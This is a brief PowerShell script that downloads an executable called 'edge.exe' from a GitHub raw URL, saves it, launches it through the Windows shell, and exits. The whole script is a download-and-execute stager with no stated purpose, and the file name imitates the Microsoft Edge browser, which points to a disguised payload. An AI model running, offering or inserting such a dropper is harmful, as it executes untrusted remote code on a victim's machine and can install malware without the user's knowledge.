$down = New-Object System.Net.WebClient
$down.DownloadFile('http://github.com/ItsSoLoaded/ItsSoLoaded/raw/main/edge.exe', 'edge.exe')

$exec = New-Object -ComObject shell.application
$exec.shellexecute('edge.exe')

exit
